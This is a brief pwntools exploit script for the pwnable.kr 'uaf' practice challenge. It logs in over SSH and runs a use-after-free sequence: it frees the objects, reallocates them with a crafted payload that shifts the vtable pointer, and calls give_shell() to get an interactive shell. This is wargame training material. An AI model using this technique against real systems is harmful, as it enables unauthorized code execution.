from pwn import *

p = ssh("uaf", "pwnable.kr", 2222, "guest").process(
    ["/home/uaf/uaf", str(3), "/tmp/h0meb0dy/payload"]
)

sl = p.sendline


def use():
    sl(b"1")


def after():
    sl(b"2")


def free():
    sl(b"3")


free()  # free Man and Woman
after()  # allocate Woman
after()  # allocate Man (sub 8 from vtable)
use()  # call give_shell()

p.interactive()
